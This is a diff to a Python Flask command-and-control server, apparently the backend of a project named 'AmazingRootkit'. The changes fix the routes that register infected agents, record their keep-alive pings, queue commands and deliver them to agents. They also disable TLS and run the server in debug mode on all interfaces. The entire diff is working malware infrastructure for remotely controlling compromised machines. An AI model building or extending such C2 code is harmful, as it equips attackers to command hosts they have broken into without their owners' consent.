@@ -67,8 +67,16 @@ client, db, campaign_collection, last_activity_collection = initialize_db()
 # Registration
 @app.route('/c2/register/', methods=['POST'])
 def registration():
-    data = request.json
-    client_id = data.get('client_id')
+    print('hi')
+    data = request.get_data(as_text=True)  # קבלת הנתונים כטקסט
+    print('Raw data:', data)  # הדפסת הנתונים כפי שהם
+    try:
+        json_data = json.loads(data)  # ניסיון לפרוס את הנתונים ל-JSON
+        client_id = json_data.get("client_id")
+        print('Client ID:', client_id)
+    except json.JSONDecodeError as e:
+        print('Error decoding JSON:', e)
+        return jsonify({'status': '1'}), 400
 
     if client_id:
         existing_client = campaign_collection.find_one({'client_id': client_id})
@@ -96,7 +104,7 @@ def registration():
                     '$set': {
                         'client_id': client_id,
                         'device_name': device_name,
-                        'registered_at': datetime.now(),
+                        'last_activity_date': datetime.now(),
                         'status': 'active'
                     }
                 },
@@ -108,14 +116,22 @@ def registration():
 
 # Keep alive
 @app.route('/c2/keep_alive/', methods=['POST'])
-def keep_alive(client_id):
-     data = request.json
-     client_id = data.get('client_id')
-     campaign_collection.update_one(
+def keep_alive():
+    data = request.json
+    client_id = data.get("client_id")
+    
+    campaign_collection.update_one(
         {'client_id': client_id},
-        {'$set': {'last_activity': datetime.now()}}
+        {'$set': {'last_activity_date': datetime.now()}}
     )
-     return 200
+    
+    response = {
+        'status': 'success',
+        'message': 'Ping acknowledged'
+    }
+    
+    return jsonify(response), 200
+
 # add command to the Q 
 @app.route('/<client_name>/add_command/', methods=['POST'])
 def add_command(client_name):
@@ -223,7 +239,7 @@ def add_command(client_name):
     
 #Send command to the Agent 
 @app.route('/c2/new_command/', methods=['POST'])
-def send_command(client_id):
+def send_command():
     data = request.json
     client_id = data.get('client_id')
     existing_client = campaign_collection.find_one({'client_id': client_id})
@@ -631,5 +647,6 @@ def delete_campaign(client_id):
 if __name__ == '__main__':
     #import IPython; IPython.embed()
     import venv
-    print(open(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem','rb').read(100))
-    app.run(debug=True, host='0.0.0.0',port=1234,ssl_context=(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem', r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\key.pem'))
+    #print(open(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem','rb').read(100))
+    #app.run(debug=True, host='0.0.0.0',port=1234,ssl_context=(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem', r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\key.pem'))
+    app.run(debug=True, host='0.0.0.0',port=1234)
